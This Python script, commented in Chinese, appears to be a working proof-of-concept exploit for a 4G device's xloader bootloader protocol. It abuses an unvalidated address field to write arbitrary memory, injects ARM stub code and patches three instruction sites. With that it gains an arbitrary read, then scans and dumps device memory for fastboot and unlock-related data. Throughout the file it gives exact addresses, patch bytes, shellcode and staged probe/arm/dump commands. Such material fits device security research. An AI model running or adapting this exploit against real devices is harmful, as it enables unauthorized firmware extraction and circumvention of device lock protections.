# -*- coding: utf-8 -*-
# 归档自 z_ar_read.py（2026-09 会话验证版）：仅参数化路径与端口，逻辑未动。
"""
z_ar_read.py — xloader 阶段任意读（漏洞利用 PoC，安全分阶段版 v2）
================================================================================
漏洞: BD 4G xloader 下载协议 HEAD 帧 ADDRESS 字段完全不校验 →
      DATA 帧执行 memcpy(ADDRESS + n*1024, payload, len)（mem 0x33C1C..0x33C2E）。

★ 基址定案: 真实内存地址 = 文件偏移 + 0x23014。
   决定性证据（ROM 校准）: ROM 原地执行、无基址歧义，其 CRC 循环 0x4BD2 用
   movw r4,#0xEDD4 装表基址，而全 ROM 唯一标准 CCITT 表恰在 0xEDD4
   ⇒ 同源代码约定 = "字面量指向 std[0]"。xloader 字面量 0x45D28 指向 std[0]
   ⇒ 基址 = 0x45D28 - 0x22D14 = 0x23014。
   （_agent_xl/PROTOCOL.md 所记 ROM 字面量 0xEDD8 系误读，实为 0xEDD4。）

安全分阶段（每步可观察、可中止，代码补丁放在最后）:
  probe     纯数据探测基址模型（写 getter 字面量候选 → CD 应答判别）
  selftest  probe + 装桩 + getter 逐字节读回验证桩/补丁点（不碰代码）
  arm       selftest + 三处代码补丁 + 1 次 CD 试读（进入 1024B/帧 模式）
  scan      arm + 扫候选地址找 fastboot 明文
  dump      arm + 连续导出
  restore   把三处补丁点的原始字节写回（解除 arm）
  getter    手动: 补 getter 字面量 → 1 B/帧 读取

判别表（写 0x23014 到 getter 字面量候选后 CD 应答）:
  写 0x41170 → 应答 0x01 = NEW 模型(基址 0x23014)   ← 预期
  写 0x4115C → 应答 0x34 = OLD 模型(基址 0x23000)   ← 回退
  0x00       = 该候选不是字面量，换下一个
"""
import os
import struct
import sys
import time
import binascii

VID, PID = 0x12D1, 0x3609
PORT_FALLBACK = None
ACK, NAK = 0xAA, 0x55
CHUNK = 0x400

# ---- 两种基址模型的全部地址/字节（已用 keystone 汇编 + capstone 复核）----
MODELS = {
    'NEW': dict(
        img_base=0x23014,
        getter_lit=0x41170,          # getter 字面量（原值 0x60014088）
        stub=0x51EC0, cursor=0x51EEC,
        bl_getter=0x33AB8, strb=0x33ABE, bl_send=0x33AC6, epilogue=0x33D22,
        stub_code=('2de9f04f09a52e68484631464ff48062d1f751fe'
                   '06f580662e60204649464ff48062e2f707fcbde8f08f00bf'),
        patch_a='1ef002fa',          # bl 0x51EC0     (替换 bl 0x41168)
        patch_b='00bf00bf',          # nop; nop       (替换 strb.w)
        patch_c='00f02cb9',          # b.w 0x33D22    (替换 bl 0x346F4)
        probe_expect=0x01,           # *(0x23014) = 文件[0] = 0x01
    ),
    'OLD': dict(
        img_base=0x23000,
        getter_lit=0x4115C,
        stub=0x51EC0, cursor=0x51EEC,
        bl_getter=0x33AA4, strb=0x33AAA, bl_send=0x33AB2, epilogue=0x33D0E,
        stub_code=('2de9f04f09a52e68484631464ff48062d1f747fe'
                   '06f580662e60204649464ff48062e2f7fdfbbde8f08f00bf'),
        patch_a='1ef00cfa',          # bl 0x51EC0     (替换 bl 0x41154)
        patch_b='00bf00bf',
        patch_c='00f02cb9',          # b.w 0x33D0E    (替换 bl 0x346E0)
        probe_expect=0x34,           # *(0x23014) = 文件[0x14] = 0x34
    ),
}
# 三处补丁点的原始文件字节（两模型相同——同一文件偏移）
ORIG_A = bytes.fromhex('0df056fb')   # bl <getter>
ORIG_B = bytes.fromhex('84f8d803')   # strb.w r0,[r4,#0x3D8]
ORIG_C = bytes.fromhex('00f015fe')   # bl <usb_send>
# 桩代码前 4 字节的期望值（push.w {r4-r8,sb,sl,fp,lr}）
STUB_HEAD = bytes.fromhex('2de9f04f')


def log(m):
    print('[%s] %s' % (time.strftime('%H:%M:%S'), m), flush=True)


# ---------------------------------------------------------------- 帧构造
def _crc_be(d):
    return struct.pack('>H', binascii.crc_hqx(d, 0))


def head(addr, length, ft=1):
    b = struct.pack('>BBBBII', 0xFE, 0x00, 0xFF, ft, length & 0xFFFFFFFF, addr & 0xFFFFFFFF)
    return b + _crc_be(b)


def data(seq, payload):
    b = struct.pack('>BBB', 0xDA, seq & 0xFF, (~seq) & 0xFF) + payload
    return b + _crc_be(b)


def cdq(seq=0):
    b = struct.pack('>BBB', 0xCD, seq & 0xFF, (~seq) & 0xFF)
    return b + _crc_be(b)


def stub_image(model, cursor):
    return bytes.fromhex(MODELS[model]['stub_code']) + struct.pack('<I', cursor & 0xFFFFFFFF)


# ---------------------------------------------------------------- 串口
def find_port():
    try:
        import serial.tools.list_ports
    except ImportError:
        return None
    for p in serial.tools.list_ports.comports():
        if p.vid == VID and p.pid == PID:
            return p.device
    return None


def open_port(port=None):
    import serial
    port = port or find_port() or PORT_FALLBACK
    ser = serial.Serial(port, 115200, timeout=2.0, write_timeout=3.0, rtscts=True, dsrdtr=True)
    ser.dtr = True
    ser.rts = True
    time.sleep(0.2)
    log('port open: %s' % port)
    return ser


def drain(ser):
    try:
        n = ser.in_waiting
        if n:
            ser.read(n)
    except Exception:
        pass


def wr_ack(ser, frame, tmo=2.0):
    drain(ser)
    ser.write(frame)
    ser.flush()
    t0 = time.time()
    while time.time() - t0 < tmo:
        b = ser.read(1)
        if b:
            return b
        time.sleep(0.01)
    return None


def write_mem(ser, addr, blob, tries=3):
    """HEAD+DATA 单帧写（不发 TAIL）。"""
    if len(blob) > CHUNK:
        raise ValueError('blob too large')
    for t in range(tries):
        r = wr_ack(ser, head(addr, len(blob)))
        if r and r[0] == ACK:
            r = wr_ack(ser, data(1, blob))
            if r and r[0] == ACK:
                return True
            log('  data NAK/none (%s)' % (r.hex() if r else 'none'))
        else:
            log('  head NAK/none (%s)' % (r.hex() if r else 'none'))
        time.sleep(0.3)
    return False


def cd_read(ser, n=1, tmo=2.5):
    """发 CD 帧收 n 字节（未 arm 时设备回 1B；arm 后回 1024B）。
    ★ arm 态下设备每 CD 固定回 1024B：n<1024 时读完后再 drain 残余，
      否则残留字节会污染下一帧的应答流（BL2 head FAIL 的根因）。"""
    drain(ser)
    ser.write(cdq(1))
    ser.flush()
    buf = bytearray()
    t0 = time.time()
    while len(buf) < n and time.time() - t0 < tmo:
        b = ser.read(n - len(buf))
        if b:
            buf += b
            t0 = time.time()
        else:
            time.sleep(0.01)
    if n < CHUNK:
        time.sleep(0.2)
        drain(ser)
    return bytes(buf)


# ---------------------------------------------------------------- 阶段
def probe_model(ser):
    """阶段1（纯数据）: 判别基址模型。返回 (model, lit_addr) 或 (None, None)。"""
    log('=== 阶段1: 基址模型探测（纯数据写，不碰代码） ===')
    for cand, mdl in ((MODELS['NEW']['getter_lit'], 'NEW'), (MODELS['OLD']['getter_lit'], 'OLD')):
        M = MODELS[mdl]
        log('  写 getter 字面量候选 0x%X <- 0x23014 ...' % cand)
        if not write_mem(ser, cand, struct.pack('<I', 0x23014)):
            continue
        r = cd_read(ser, 1, 2.0)
        log('  CD 应答: %s' % (r.hex() if r else 'none'))
        if r and r[0] == M['probe_expect']:
            log('  *** 模型判定: %s（基址 0x%X）***' % (mdl, M['img_base']))
            return mdl, cand
        log('  候选不匹配（预期 %02X）' % M['probe_expect'])
    log('FAIL: 两个候选均未命中 —— 不要继续，检查设备状态')
    return None, None


def getter_read(ser, lit, addr, n=1):
    """用 getter 字面量读 n 字节（每字节一次重定位 + 一次 CD）。"""
    out = bytearray()
    for i in range(n):
        if not write_mem(ser, lit, struct.pack('<I', (addr + i) & 0xFFFFFFFF)):
            return None
        r = cd_read(ser, 1, 2.0)
        if not r:
            return None
        out.append(r[0])
    return bytes(out)


def selftest(ser, model, lit):
    """阶段2: 装桩 + getter 读回验证（不碰代码）。"""
    M = MODELS[model]
    log('=== 阶段2: 装桩 + 读回验证 ===')
    if not write_mem(ser, M['stub'], stub_image(model, 0x1A400000)):
        log('FAIL: 桩写入失败'); return False
    log('  桩 48B 写入 OK')
    got = getter_read(ser, lit, M['stub'], 4)
    log('  读回桩头 4B: %s（期望 %s）' % (got.hex() if got else 'none', STUB_HEAD.hex()))
    if got != STUB_HEAD:
        log('FAIL: 桩读回不匹配'); return False
    site = getter_read(ser, lit, M['bl_getter'], 4)
    log('  读回补丁点 A @0x%X: %s（期望原始 %s）' % (M['bl_getter'], site.hex() if site else 'none', ORIG_A.hex()))
    if site != ORIG_A:
        log('FAIL: 补丁点内容与预期不符 —— 基址模型可能有误，中止'); return False
    log('=== 阶段2 通过：写原语/桩/补丁点全部验证 ===')
    return True


def arm(ser, model, lit, cursor):
    """阶段3: 三处代码补丁 + 试读。cursor 建议先用安全地址(0x23014)验证，
    之后再单独写游标指向 DDR。"""
    M = MODELS[model]
    log('=== 阶段3: 打代码补丁（A/B/C） ===')
    for name, addr, blob, orig in (('A bl->stub', M['bl_getter'], bytes.fromhex(M['patch_a']), ORIG_A),
                                   ('B nop-strb', M['strb'], bytes.fromhex(M['patch_b']), ORIG_B),
                                   ('C b.w-epi', M['bl_send'], bytes.fromhex(M['patch_c']), ORIG_C)):
        if not write_mem(ser, addr, blob):
            log('FAIL: 补丁 %s 写入失败 —— 可用 restore 恢复' % name); return False
        log('  %s @0x%X OK' % (name, addr))
    if not write_mem(ser, M['cursor'], struct.pack('<I', cursor & 0xFFFFFFFF)):
        log('FAIL: 游标设置失败'); return False
    d = cd_read(ser, CHUNK, 3.0)
    log('  CD 试读 @0x%X: %d B  head=%s' % (cursor, len(d), d[:16].hex()))
    if len(d) == CHUNK:
        log('*** 任意读已激活: 1024 B/帧 ***')
        return True
    log('FAIL: 试读未满帧 —— 可 restore 后排查')
    return False


LIT_ORIG = 0x60014088   # getter 字面量原值


def restore(ser, model):
    M = MODELS[model]
    log('=== 恢复原始字节 ===')
    ok = True
    for addr, orig in ((M['bl_getter'], ORIG_A), (M['strb'], ORIG_B), (M['bl_send'], ORIG_C),
                       (M['getter_lit'], struct.pack('<I', LIT_ORIG))):
        if not write_mem(ser, addr, orig):
            ok = False
            log('  restore @0x%X 失败' % addr)
    log('restore %s' % ('完成' if ok else '部分失败'))
    return ok


# ---------------------------------------------------------------- 动作
def cmd_dry():
    img = stub_image('NEW', 0x1A400000)
    print('== NEW 模型（基址 0x23014）==')
    print('HEAD(0x%X,%d): %s' % (0x51EC0, len(img), head(0x51EC0, len(img)).hex()))
    print('DATA(1):       %s' % data(1, img).hex())
    print('getter probe:  HEAD %s DATA %s' % (head(0x41170, 4).hex(), data(1, struct.pack('<I', 0x23014)).hex()))
    for n, a, b in (('A', 0x33AB8, '1ef002fa'), ('B', 0x33ABE, '00bf00bf'), ('C', 0x33AC6, '00f02cb9')):
        print('patch %s @0x%X: HEAD %s DATA %s' % (n, a, head(a, 4).hex(), data(1, bytes.fromhex(b)).hex()))
    print('INQUIRE:       %s' % cdq(1).hex())
    print('== OLD 模型（基址 0x23000, 回退）==')
    img2 = stub_image('OLD', 0x1A400000)
    print('stub:          %s' % img2.hex())
    print('patch A/B/C @ 0x33AA4/0x33AAA/0x33AB2: 1ef00cfa / 00bf00bf / 00f02cb9')


def run_probe(port=None):
    ser = open_port(port)
    try:
        r = cd_read(ser, 1, 1.5)
        log('预检 CD: %s（期望 1 字节，如 00）' % (r.hex() if r else 'none'))
        if not r:
            log('设备无应答 —— 检查是否已进入 xloader 下载模式'); return None, None, ser
        model, lit = probe_model(ser)
        return model, lit, ser
    except Exception:
        ser.close(); raise


def cmd_probe():
    ser = open_port()
    try:
        r = cd_read(ser, 1, 1.5)
        log('预检 CD: %s' % (r.hex() if r else 'none'))
        probe_model(ser)
    finally:
        ser.close()
    return 0


def cmd_selftest():
    model, lit, ser = run_probe()
    try:
        if model:
            selftest(ser, model, lit)
    finally:
        ser.close()
    return 0


def cmd_arm(cursor=None):
    model, lit, ser = run_probe()
    try:
        if not model:
            return 1
        # 先用安全地址(镜像自身起点)验证 arm，绝不 fault
        if not selftest(ser, model, lit):
            return 1
        if not arm(ser, model, lit, MODELS[model]['img_base']):
            return 1
        if cursor is not None:
            M = MODELS[model]
            if not write_mem(ser, M['cursor'], struct.pack('<I', cursor & 0xFFFFFFFF)):
                log('FAIL: 游标指向 0x%X 失败' % cursor); return 1
            d = cd_read(ser, CHUNK, 3.0)
            log('游标已指向 0x%X: %d B head=%s' % (cursor, len(d), d[:16].hex()))
        return 0
    finally:
        ser.close()
        log('（arm 状态在设备断电前保持；CD 现在每帧回 1024B）')


def cmd_scan():
    model, lit, ser = run_probe()
    try:
        if not model:
            return 1
        if not selftest(ser, model, lit):
            return 1
        M = MODELS[model]
        if not arm(ser, model, lit, M['img_base']):
            return 1
        for base in (0x1A400000, 0x3A400000, 0x1A000000, 0x20000000, 0x10000000):
            log('--- 读 0x%08X (4KB) ---' % base)
            if not write_mem(ser, M['cursor'], struct.pack('<I', base)):
                log('  游标设置失败'); continue
            d = b''
            for _ in range(4):
                d += cd_read(ser, CHUNK, 3.0)
            tags = []
            if d[:4] == b'\x7fELF':
                tags.append('ELF')
            if d[:4] == bytes.fromhex('0d000014'):
                tags.append('AArch64-vector')
            for pat in (b'fastboot', b'oem unlock', b'userlock', b'Android'):
                if pat in d:
                    tags.append(pat.decode('latin1'))
            log('  0x%08X: %d B  [%s]  %s' % (base, len(d), ','.join(tags) or '-', d[:16].hex()))
        return 0
    finally:
        ser.close()


def cmd_dump(addr, size, out=None):
    model, lit, ser = run_probe()
    out = out or os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ARDUMP_%08X.bin' % addr)
    try:
        if not model:
            return 1
        if not selftest(ser, model, lit):
            return 1
        M = MODELS[model]
        if not arm(ser, model, lit, MODELS[model]['img_base']):
            return 1
        if not write_mem(ser, M['cursor'], struct.pack('<I', addr & 0xFFFFFFFF)):
            log('FAIL: 游标指向 0x%X 失败' % addr); return 1
        f = open(out, 'wb')
        got = 0
        t0 = time.time()
        while got < size:
            d = cd_read(ser, CHUNK, 3.0)
            if not d:
                log('无响应 @+0x%X，停止（可重跑 dump，已存 %d B）' % (got, got))
                break
            f.write(d); got += len(d)
            if got % 0x10000 < CHUNK:
                log('  %d/%d B (%.0f B/s)' % (got, size, got / max(time.time() - t0, 0.1)))
                f.flush()
        f.close()
        log('dump: %d B -> %s' % (got, out))
        return 0
    finally:
        ser.close()


def cmd_restore():
    model, lit, ser = run_probe()
    try:
        if model:
            restore(ser, model)
    finally:
        ser.close()
    return 0


def cmd_getter(lit, target):
    ser = open_port()
    try:
        if not write_mem(ser, lit, struct.pack('<I', target & 0xFFFFFFFF)):
            return 1
        for i in range(8):
            r = cd_read(ser, 1, 1.5)
            log('CD: %s' % (r.hex() if r else 'none'))
        return 0
    finally:
        ser.close()


def main():
    a = sys.argv[1:]
    if not a:
        print(__doc__); return 0
    c = a[0].lower()
    if c == 'dry':       cmd_dry(); return 0
    if c == 'probe':     return cmd_probe()
    if c == 'selftest':  return cmd_selftest()
    if c == 'arm':       return cmd_arm(int(a[1], 0) if len(a) > 1 else 0x1A400000)
    if c == 'scan':      return cmd_scan()
    if c == 'dump':
        return cmd_dump(int(a[1], 0), int(a[2], 0), a[3] if len(a) > 3 else None)
    if c == 'restore':   return cmd_restore()
    if c == 'getter':
        return cmd_getter(int(a[1], 0), int(a[2], 0))
    print(__doc__); return 0


if __name__ == '__main__':
    sys.exit(main())
